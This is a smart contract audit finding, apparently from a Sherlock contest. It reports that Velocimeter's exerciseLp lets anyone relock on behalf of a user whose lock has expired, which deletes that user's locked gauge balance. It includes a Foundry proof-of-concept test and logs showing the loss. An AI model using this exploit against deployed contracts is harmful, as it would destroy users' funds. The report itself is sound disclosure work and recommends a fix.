# Users can lose their tokens in the gauge

## Summary

## Vulnerability Detail
The exerciseLp function creates LP tokens, and after that, it stakes in gauges with the depositWithLock function.

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/OptionTokenV4.sol#L652-L716
```solidity
// Create Lp for users
        _safeApprove(underlyingToken, router, _amount);
        _safeApprove(paymentToken, router, paymentAmountToAddLiquidity);
        (, , lpAmount) = IRouter(router).addLiquidity(
            underlyingToken,
            paymentToken,
            false,
            _amount,
            paymentAmountToAddLiquidity,
            1,
            1,
            address(this),
            block.timestamp
        ); 

        // Stake the LP in the gauge with lock
        address _gauge = gauge;
        _safeApprove(address(pair), _gauge, lpAmount);
        IGaugeV4(_gauge).depositWithLock(
            _recipient,
            lpAmount,
            getLockDurationForLpDiscount(_discount)
        ); 
```

The depositWithLock function deposits tokens and creates a lock. If the current lock has expired, it deletes it before locking again.

```solidity
if(block.timestamp >= lockEnd[account]) { // if the current lock is expired relased the tokens from that lock before loking again
            delete lockEnd[account];
            delete balanceWithLock[account];
        }
```

The problem is that anyone can call exerciseLp for anyone, which means anyone can create a lock for any user. If an attacker uses the exercisesLp function for a user whose lock has expired, that user's balance will be deleted even if the user didn't withdraw his tokens.
## Impact
Users can lose their tokens.
## Code Snippet
OptionTokenV4.t.sol


```solidity
function testExerciseLpV4() public {
        vm.startPrank(address(owner));
        DAI.approve(address(oFlowV4), TOKEN_100K);
        FLOW.approve(address(oFlowV4), TOKEN_100K);
        // mint Option token to owner 2
        oFlowV4.mint(address(owner2), TOKEN_100);
        oFlowV4.mint(address(owner), TOKEN_100);

        washTrades();
        vm.stopPrank();

        vm.startPrank(address(owner2));
        DAI.approve(address(oFlowV4), TOKEN_100K);

        oFlowV4.exerciseLp(
            100e18,
            100e18,
            address(owner2),
            20,
            block.timestamp
        );
        vm.stopPrank();

        uint expired = gauge.lockEnd(address(owner2));
        console.log("Before : ", gauge.balanceWithLock(address(owner2)));

        vm.warp(expired);

        vm.startPrank(address(owner));
        oFlowV4.exerciseLp(1e18, 1e18, address(owner2), 20, block.timestamp);

        console.log("After : ", gauge.balanceWithLock(address(owner2)));
    }
```

```bash
Logs:
  Before :  100000000099372902838
  After :  1000000000993729027
```
Even if the owner2 has a balance of 100e18, due to the attacker, it is now 1e18.

## Recommendation
Do not allow users to use the exerciseLp function to deposit for another user.
